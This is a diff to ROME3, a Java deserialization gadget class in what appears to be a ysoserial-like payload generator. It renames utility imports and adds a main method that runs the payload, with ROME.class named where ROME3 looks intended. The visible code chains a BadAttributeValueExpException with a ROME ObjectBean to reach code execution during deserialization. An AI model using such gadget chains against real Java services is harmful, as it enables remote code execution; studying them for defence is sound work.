@@ -1,12 +1,13 @@
 package A.R.ysogate.payloads.gadgets;
 
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import com.sun.syndication.feed.impl.ObjectBean;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import javax.management.BadAttributeValueExpException;
 import javax.xml.transform.Templates;
@@ -25,5 +26,9 @@ public class ROME3 implements ObjectPayload<Object> {
 		BadAttributeValueExpException b        = new BadAttributeValueExpException("");
 		Reflections.setFieldValue(b, "val", delegate);
 		return b;
+	}
+
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(ROME.class, args);
 	}
 }
